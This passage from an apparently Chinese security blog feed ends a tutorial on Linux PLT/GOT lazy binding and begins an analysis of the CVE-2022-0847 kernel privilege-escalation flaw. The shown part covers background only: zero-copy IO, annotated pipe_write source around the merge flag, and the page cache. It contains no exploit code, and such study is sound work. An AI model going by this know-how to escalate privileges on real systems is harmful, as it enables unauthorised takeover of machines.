在上文中，我们提到要开辟一个数据段中的表存各种库函数的地址，也就是程序运行时要维护这个表的内容（需要把动态链接库的地址填入got表），才能达成函数调用，那么，如何维护，是刚开始运行一次就把这个表填好，还是每次调用的时候往里填？linux系统选择了后者，原因如下：</p><p>​    如果可执行文件调用的<strong>动态库函数</strong>很多时，那在进程初始化时都对这些函数做<strong>地址解析和重定位</strong>工作，大大增加进程的启动时间。所以Linux提出<strong>延迟重定位</strong>机制，只有动态库函数在被调用时，才会地址解析和重定位工作，这就是延迟绑定。</p><p>​    那么，怎么实现延迟绑定？</p><p>​    进程启动时，先不对GOT表项做重定位，等到要调用该函数时才做重定位工作。要实现这个机制必须要有一个状态位，用于描述该GOT表项是否已完重定位。</p><p>​    正常的思路就像这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">printf</span>@got[<span class="number">0</span>] ！= RELOCATED) &#123; <span class="comment">// 如果没完成重定位</span></span><br><span class="line">        <span class="function">call <span class="title">relocate</span><span class="params">(got)</span><span class="comment">//调用重定位函数</span></span></span><br><span class="line"><span class="function">        <span class="built_in">printf</span>@got[1] </span>= 地址解析发现的<span class="built_in">printf</span>地址;</span><br><span class="line">        <span class="built_in">printf</span>@got[<span class="number">0</span>] = RELOCATED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jmp *<span class="built_in">printf</span>@got[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    这个方案是可行的，但是每个函数就必须使用两个GOT表项（存地址的，和存状态的），占用内存明显增长了一倍，而且非常冗余，看着难受。Linux动态链接器想出了一个绝妙的方案，将这两个GOT表项合二为一。</p><p>​    具体怎么做呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got            <span class="comment">// 链接器将printf@got填成下一语句lookup_printf的地址</span></span><br><span class="line"></span><br><span class="line">lookup_printf:</span><br><span class="line">        调用重定位函数查找<span class="built_in">printf</span>地址，并写到<span class="built_in">printf</span>@got</span><br><span class="line">        <span class="keyword">goto</span> address_good;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在链接成可执行文件test时，链接器将printf@<strong>got表项</strong>的内容<strong>填写lookup_printf标签的地址</strong>。</p><p>​    就是说，程序第一次调用printf是时，通过printf@got表项引导到查找printf的plt指令的后半部分。在后半部分中跳到动态链接器中将printf址解析出来，并重定位回printf@got项内。第二次调用printf时，通过printf@got直接跳到printf函数执行了。简直太聪明了。</p><h2 id="0x04-plt如何实现对于库函数的查找"><a href="#0x04-plt如何实现对于库函数的查找" class="headerlink" title="0x04 plt如何实现对于库函数的查找"></a>0x04 plt如何实现对于库函数的查找</h2><p>​    所有动态库函数的plt指令最终都跳进（jmp）公共plt执行，而公共plt指向的是存在<strong>got表</strong>中**_dl_runtime_resolve**函数的地址。所有动态库函数在第一次调用时，都是通过XXX@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve调用关系做地址解析和重定位的。</p><p>​    现在存在两个问题：</p><p>问题一，如何传参到**_dl_runtime_resolve函数<strong>？<br>问题二，如何获得</strong>_dl_runtime_resolve函数<strong>的返回值，即</strong>_dl_runtime_resolve**如何把值回填到GOT表？</p><p>​    这就涉及到了另一个表：**.rel.plt**    查看其内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r test</span><br><span class="line">....</span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset <span class="number">0x25c</span> contains <span class="number">3</span> entries:</span><br><span class="line"> Offset     Info     Type             Sym.Value  Sym. Name</span><br><span class="line"> <span class="number">080496f</span>8   <span class="number">00000107</span> R_386_JUMP_SLOT  <span class="number">00000000</span>   <span class="built_in">puts</span></span><br><span class="line"> <span class="number">080496f</span>c   <span class="number">00000207</span> R_386_JUMP_SLOT  <span class="number">00000000</span>   __gmon_start__</span><br><span class="line"> <span class="number">08049700</span>   <span class="number">00000407</span> R_386_JUMP_SLOT <span class="number">000000000</span>   __libc_start_main    </span><br></pre></td></tr></table></figure><p>​    按照这个表中的偏移进行传参，比如puts偏移是0x00，main则是0x10。同时将offset字段作为返回地址，也就是offset字段记录了GOT表的地址。</p><h2 id="0x05-dl-runtime-resolve函数的装载"><a href="#0x05-dl-runtime-resolve函数的装载" class="headerlink" title="0x05 _dl_runtime_resolve函数的装载"></a>0x05 _dl_runtime_resolve函数的装载</h2><p>​    上文中，我们提到延迟绑定的时候查动态链接函数地址需要_dl_runtime_resolve函数， _dl_runtime_resolve函数的值是存在got表中的，但是 _dl_runtime_resolve函数的值是啥时候放进去的，谁放进去的？</p><p>​    答案很简单，可执行文件在Linux内核通过exeve装载完成之后，不直接执行，而是先跳到动态链接器（ld-linux-XXX）执行。在ld-linux-XXX里将_dl_runtime_resolve地址写到GOT表项内。</p><p>​    事实上，不单单是预先写_dl_runtime_resolve地址到GOT表项中，在i386架构下，除了每个函数占用一个GOT表项外，GOT表项还保留了３个公共表项，也即got的前３项，分别保存：</p><ul><li>got[0]: 本ELF动态段(.dynamic段）的装载地址</li><li>got[1]：本ELF的link_map数据结构描述符地址</li><li>got[2]：_dl_runtime_resolve函数的地址</li></ul><p>​    动态链接器在加载完ELF之后，都会将这３地址写到GOT表的前３项。<br>​    其实上述公共的plt指令里面，还有一个操作数是没有分析的，其实它就是got[1]（本ELF的link_map)地址，因为只有link_map结构，结合.rel.plt段的偏移量，才能真正找到该elf的.rel.plt表项。</p><h2 id="0x06-编译后plt、got表总览"><a href="#0x06-编译后plt、got表总览" class="headerlink" title="0x06 编译后plt、got表总览"></a>0x06 编译后plt、got表总览</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220508160003226.png" alt="image-20220508160003226"></p><p>PLT表结构有以下特点：</p><ul><li>PLT表中的第一项为<strong>公共表项</strong>，剩下的是每个动态库函数为一项（当然每项是由多条指令组成的，jmp *0xXXXXXXXX这条指令是所有plt的开始指令）；</li><li>每项PLT都从对应的GOT表项中读取目标函数地址；</li></ul><p>GOT表结构有以下特点：</p><ul><li>GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址；</li><li>在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充；</li><li>3个特殊项后面依次是每个动态库函数的GOT表项；</li></ul><h2 id="0x07-运行时plt、got表总览"><a href="#0x07-运行时plt、got表总览" class="headerlink" title="0x07 运行时plt、got表总览"></a>0x07 运行时plt、got表总览</h2><p>​    PLT属于<strong>代码段</strong>，在进程加载和运行过程都不会发生改变，PLT指向GOT表的关系在编译时已完全确定，唯一能发生变化的是GOT表。</p><p>​    Linux加载进程时，通过<strong>execve系统</strong>调用进入<strong>内核态</strong>，将镜像加载到内存，然后返回<strong>用户态</strong>执行。返回用户态时，它的控制权并不是交给可执行文件，而是给动态链接器去完成一些基础的功能，比如上述的GOT[1]，GOT[2]的填写就是这个阶段完成的。下图是动态链接器填完GOT[1]，GOT[2]后的GOT图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220508160539703.png" alt="image-20220508160539703"></p><p>​    动态链接器怎么知道GOT的首地址？其实这个值记录在ELF的**.dynamic段**里面。</p><h2 id="0x08-重定位前后概况"><a href="#0x08-重定位前后概况" class="headerlink" title="0x08 重定位前后概况"></a>0x08 重定位前后概况</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220508160809867.png" alt="image-20220508160809867"></p><p>参考上文中对于延迟绑定重定位的解释，在第一次调用put函数时，实际的重定位分为九部：</p><ol><li>代码<strong>调用</strong>puts函数，调用时EIP跳转到plt表中；</li><li>plt表中跳转指令指向GOT表中的初值；</li><li>初值直接跳转到**_dl_runtime_resolve函数**的执行流程；</li><li>该执行流程跳转到<strong>plt表的common头</strong>；</li><li><strong>plt表的common头</strong>中的跳转指令的参数指向got表第三个表项，也就是**_dl_runtime_resolve函数**的地址；</li><li>传参（参数是要查询的函数的序列号，通过**.rel.plt<strong>记录）后，跳转到</strong>_dl_runtime_resolve函数**；</li><li><strong>_dl_runtime_resolve函数</strong>执行时修改GOT表中的对应值；</li><li><strong>_dl_runtime_resolve函数</strong>执行完毕后直接跳转到puts函数中；</li><li>返回调用母函数；</li></ol><p>下一次调用时就简单多了，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220508161828578.png" alt="image-20220508161828578"></p><p>至此全文完，感谢CSDN博主「海枫」的优秀教程！</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-0847内核提权漏洞分析复现</title>
      <link href="/2022/04/29/CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/29/CVE-2022-0847%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-0847内核提权漏洞分析复现"><a href="#CVE-2022-0847内核提权漏洞分析复现" class="headerlink" title="CVE-2022-0847内核提权漏洞分析复现"></a>CVE-2022-0847内核提权漏洞分析复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220421103234337.png" alt="image-20220421103234337"></p><p>翻译翻译：</p><blockquote><p>A flaw was found in the way the  “flags” member of the new pipe buffer structure was lacking proper initialization in copy_page_to_iter_pipe and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.</p></blockquote><p>​    就是有一个pipe结构中，有一个flag成员，他初始化的时候调用了copy_page_to_iter_pipe、push_pipe两个函数，这两个函数有可能不能正确的初始化，最终导致的就是只读文件可写，然后就可以导致一个本地的权限提升。</p><h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><p>首先需要解释上面漏洞概述中的一些noun</p><h3 id="一、文件读写背景知识"><a href="#一、文件读写背景知识" class="headerlink" title="一、文件读写背景知识"></a>一、文件读写背景知识</h3><h4 id="1、传统IO模式"><a href="#1、传统IO模式" class="headerlink" title="1、传统IO模式"></a>1、传统IO模式</h4><p>​    磁盘的IO读写速度是很慢的，所以一般当我们访问一个磁盘文件的时候，首先会将其内容装载到物理内存中，后续的访问都是直接取内存中的副本来读取数据。因为一个文件的内存副本，后续可能会被很多进程打开使用，为了保证大家都能快速的访问，Linux设计了这样一个Page Cache机制管理起物理内存中映射的页框。</p><p>​    如果用户进程使用read/write读写文件，那么内核会先将载入数据的物理内存映射到内核虚拟内存buffer。然后再将内核的buffer数据拷贝到用户态。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/c2ae42cb72b84648880e2885b5d7feab.png" alt="在这里插入图片描述"></p><p>​    这里简单的做一个理解（，这里磁盘和物理内存都是硬件，然后物理内存的内容通过页表映射，相当于对于内存做了一个索引，但是用户要读数据，不能直接和硬件交互，也不能直接读内核，用户只能和操作系统提供的<strong>接口</strong>交互，也就是上图左边写的<strong>拷贝</strong>两个字，意思是从<strong>内核空间</strong>中把<strong>buffer</strong>再复制到<strong>用户空间</strong>，这样在用户空间中，其他进程需要<strong>buffer</strong>时，再与<strong>进程1</strong>进行通信。</p><p>​    为了加深理解，我们再举个例子：</p><p>​    现在我要将硬盘中的一个文件上传到网络上，电脑需要做些什么呢？首先，通过<code>read()</code>把数据从硬盘读取到内核缓冲区，然后，再复制到用户缓冲区；之后，再通过<code>write()</code>写入到<code>socket缓冲区</code>，最后写入网卡设备。</p><p>整个过程发生了<strong>4次用户态和内核态的上下文切换</strong>和<strong>4次拷贝</strong>，具体流程如下：</p><ol><li>用户进程通过<code>read()</code>方法向操作系统发起调用，此时上下文从用户态转向内核态</li><li>DMA控制器把数据从硬盘中拷贝到读缓冲区</li><li>CPU把读缓冲区数据拷贝到应用缓冲区，上下文从内核态转为用户态，<code>read()</code>返回</li><li>用户进程通过<code>write()</code>方法发起调用，上下文从用户态转为内核态</li><li>CPU将应用缓冲区中数据拷贝到socket缓冲区</li><li>DMA控制器把数据从socket缓冲区拷贝到网卡，上下文从内核态切换回用户态，<code>write()</code>返回</li></ol><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429101522755.png" alt="image-20220429101522755"></p><p>​    </p><p>​    这里存在一个问题，那就是太慢，这样交互的过程始终存在一个经过内核复制到用户，再经过用户复制到内核的过程，如果能直接和内核，让内核直接处理这些事情，那就就更快了！因此，我们就引入了<strong>零拷贝</strong>的概念。</p><h4 id="2、新的IO-零拷贝"><a href="#2、新的IO-零拷贝" class="headerlink" title="2、新的IO 零拷贝"></a>2、新的IO 零拷贝</h4><p>​    首先，零拷贝并不是不拷贝！上述的图中就可以看出，最少的拷贝次数是两次（从硬盘到内核，然后直接到网卡）。因此，零拷贝的作用就是减少了拷贝文件的次数。</p><h5 id="mmap："><a href="#mmap：" class="headerlink" title="mmap："></a>mmap：</h5><p>​    这里有针对性地，就以一个<strong>mmap</strong>为例，讲一讲具体如何实现零拷贝：</p><p>​    依然是上面的例子：</p><p>​    mmap+write简单来说就是使用<code>mmap</code>替换了read+write中的read操作，减少了一次CPU的拷贝。</p><p>​    <code>mmap</code>主要实现方式是将读缓冲区的地址和用户缓冲区的地址进行映射，内核缓冲区和应用缓冲区共享，从而减少了从读缓冲区到用户缓冲区的一次CPU拷贝。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429102940747.png" alt="image-20220429102940747"></p><p>​    整个过程发生了<strong>4次用户态和内核态的上下文切换</strong>和<strong>3次拷贝</strong>，具体流程如下：</p><ol><li>用户进程通过<code>mmap()</code>方法向操作系统发起调用，上下文从用户态转向内核态</li><li>DMA控制器把数据从硬盘中拷贝到读缓冲区</li><li><strong>上下文从内核态转为用户态，mmap调用返回</strong></li><li>用户进程通过<code>write()</code>方法发起调用，上下文从用户态转为内核态</li><li><strong>CPU将读缓冲区中数据拷贝到socket缓冲区</strong></li><li>DMA控制器把数据从socket缓冲区拷贝到网卡，上下文从内核态切换回用户态，<code>write()</code>返回</li></ol><p>​    总结一下：<code>mmap</code>的方式节省了一次CPU拷贝，同时由于用户进程中的内存是虚拟的，只是映射到内核的读缓冲区，所以可以节省一半的内存空间，比较适合大文件的传输。</p><p>​    下面这张图也是同样的意思，不发生系统调用，跨越用户和内核的边界做上下文切换。用户进程可以使用mmap直接将用户态的buffer 映射到物理内存，不需要进行系统调用，直接访问自己的mmap区域即可访问到那段物理内存内容。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/79746fc8d81a4e7ab9f28d4ea035fec0.png" alt="在这里插入图片描述"></p><p>​    </p><h5 id="sendfile："><a href="#sendfile：" class="headerlink" title="sendfile："></a>sendfile：</h5><p>相比<code>mmap</code>来说，<code>sendfile</code>同样减少了一次CPU拷贝，而且还减少了2次上下文切换！</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429110942910.png" alt="image-20220429110942910"></p><p>​    可以看到，整个过程发生了<strong>2次用户态和内核态的上下文切换</strong>和<strong>3次拷贝</strong>，具体流程如下：</p><ol><li>用户进程通过<code>sendfile()</code>方法向操作系统发起调用，上下文从用户态转向内核态</li><li>DMA控制器把数据从硬盘中拷贝到读缓冲区</li><li>CPU将读缓冲区中数据拷贝到socket缓冲区</li><li>DMA控制器把数据从socket缓冲区拷贝到网卡，上下文从内核态切换回用户态，<code>sendfile</code>调用返回</li></ol><p>​    但是，<code>sendfile</code>方法IO数据对用户空间完全不可见，所以只能适用于完全不需要用户空间处理的情况，比如静态文件服务器。</p><p>​    当然，我们可能还有很多效率更高，copy次数更少的零拷贝方式，但是我们只需要了解mmap和senfile这两种，方便我们理解下面的内容即可。</p><h3 id="二、pipe相关的结构与函数"><a href="#二、pipe相关的结构与函数" class="headerlink" title="二、pipe相关的结构与函数"></a>二、pipe相关的结构与函数</h3><p>文件通过管道传输流程：<br> in端 == write == pipe == splice == out端<br> out端通过splice与内核缓冲区进行共享，然后in端调用write将内容拷贝到内核缓冲区进而写入到out端。</p><h4 id="1、pipe-write"><a href="#1、pipe-write" class="headerlink" title="1、pipe_write"></a>1、pipe_write</h4><p>​    <code>pipe</code> 是内核提供的一个通信管道，通过<code>pipe/pipe2</code> 函数创建，返回两个文件描述符，一个用于发送数据，另一个用于接受数据，类似管道的两段。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/a9bfd558081a4bdab99a26f76580d046.png" alt="在这里插入图片描述"></p><p>​    在内核中的实现，通常pipe 缓存空间总长度65536 字节用页的形式进行管理，总共16页(一页4096字节)，页面之间并不连续，而是通过数组进行管理，形成一个环形链表。维护两个链表指针，一个用来写(<code>pipe-&gt;head</code>)，一个用来读(<code>pipe-&gt;tail</code>)，两个指针中间的就是正在使用的东西。</p><p>​    看源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="keyword">ssize_t</span> chars;</span><br><span class="line"><span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">··· ···</span><br><span class="line">    ··· ···</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; </span><br><span class="line">        <span class="comment">//[1]pipe 缓存不为空，则尝试是否能从当前最后一页&quot;接着&quot;写</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line"><span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123; </span><br><span class="line">            <span class="comment">/*[2]关键，如果PIPE_BUF_FLAG_CAN_MERGE 标志位存在，代表该页允许接着写</span></span><br><span class="line"><span class="comment">             *如果写入长度不会跨页，则接着写，否则直接另起一页 */</span></span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">···</span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">···</span><br><span class="line">&#125;</span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line">···</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;<span class="comment">//[3]如果上一页没法接着写，则重新起一页</span></span><br><span class="line">··· ···</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;<span class="comment">//[4]重新申请一个新页</span></span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">··· ···</span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;<span class="comment">//[5]将新申请的页放到页数组中</span></span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">            <span class="comment">//[6]设置flag，默认PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from); </span><br><span class="line">            <span class="comment">//[7]拷贝操作</span></span><br><span class="line">··· ···</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">··· ···</span><br><span class="line">&#125;</span><br><span class="line">        ··· ···</span><br><span class="line">    &#125;</span><br><span class="line">··· ···</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过程如下：</p><ol><li>如果当前管道(pipe)中不为空(head==tail判定为空管道)，则说明现在管道中有未被读取的数据，则获取head 指针，也就是指向最新的用来写的页，查看该页的len、offset(为了找到数据结尾)。接下来尝试在当前页面续写</li><li>判断 当前页面是否带有 PIPE_BUF_FLAG_CAN_MERGE flag标记，如果不存在则不允许在当前页面续写。或当前写入的数据拼接在之前的数据后面长度超过一页(即写入操作跨页)，如果跨页，则无法续写。</li><li>如果无法在上一页续写，则另起一页</li><li>alloc_page 申请一个新的页</li><li>将新的页放在数组最前面(可能会替换掉原有页面)，初始化值。</li><li>buf-&gt;flag 默认初始化为PIPE_BUF_FLAG_CAN_MERGE ，因为默认状态是允许页可以续写的.</li><li>拷贝写入的数据，没拷贝完重复上述操作。</li></ol><p>​    上述这个过程讲的就是如何从内核读取一个数据到用户态，也就是所谓的in到out；</p><p>​    这里写一下我的理解：pip-buf是指针，对于相应的page地址做写操作，但是写之前需要判断一个flag，来判断是否能写，这里的page相当于上面提到的一个虚拟内存空间，不直接指向物理内存。</p><h4 id="2、零拷贝——splice"><a href="#2、零拷贝——splice" class="headerlink" title="2、零拷贝——splice()"></a>2、零拷贝——splice()</h4><p>​    上文中提到，为了免去数据由内核复制到用户态的额外消耗，操作系统额外提供零拷贝的方法，让用户直接操作内核中的数据。</p><p>​    在pipe机制中，直接让用户能够通过buf直接指向内核态中的内容，这个方法也就是<strong>splice</strong>。（这里解释一下，所谓零拷贝只是相对于传统拷贝的一种思想，上文中提到的mmap和将要提到的splice都是对于零拷贝这种思想的不同的实现方法。）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/d3fc29503b7d4a7ea696c2b9f46d323a.png" alt="在这里插入图片描述"></p><p>​    这里由于我们pipe里面的地址直接指向了物理地址，也就是<strong>page cache</strong>（page cache是文件在内存中的映像，长期储存在内存中，可以反复被调用，下一部分会详细讲到），此时，当我们再使用<strong>pip_write</strong>函数时，就是直接更改物理内存中的文件映像了。</p><h4 id="3、page-cache"><a href="#3、page-cache" class="headerlink" title="3、page cache"></a>3、page cache</h4><p>​    我们知道文件一般存放在硬盘中，CPU 并不能直接访问硬盘中的数据，而是需要先将硬盘中的数据读入到内存中，然后才能被 CPU 访问。由于读写硬盘的速度比读写内存要慢很多（DDR4 内存读写速度是机械硬盘500倍，是固态硬盘的200倍），所以为了避免每次读写文件时，都需要对硬盘进行读写操作，Linux 内核使用 <strong>页缓存（Page Cache）</strong> 机制来对文件中的数据进行缓存。</p><p>​    为了提升对文件的读写效率，Linux 内核会以页大小（4KB）为单位，将文件划分为多数据块。当用户对文件中的某个数据块进行读写操作时，内核首先会申请一个内存页（称为 <code>页缓存</code>）与文件中的数据块进行绑定。如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429115326780.png" alt="image-20220429115326780"></p><p>​    如上图所示，当用户对文件进行读写时，实际上是对文件的 <code>页缓存</code> 进行读写。所以对文件进行读写操作时，会分以下两种情况进行处理：</p><ul><li>当从文件中读取数据时，如果要读取的数据所在的页缓存已经存在，那么就直接把页缓存的数据拷贝给用户即可。否则，内核首先会申请一个空闲的内存页（页缓存），然后从文件中读取数据到页缓存，并且把页缓存的数据拷贝给用户。</li><li>当向文件中写入数据时，如果要写入的数据所在的页缓存已经存在，那么直接把新数据写入到页缓存即可。否则，内核首先会申请一个空闲的内存页（页缓存），然后从文件中读取数据到页缓存，并且把新数据写入到页缓存中。对于被修改的页缓存，内核会定时把这些页缓存刷新到文件中。</li></ul><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><h3 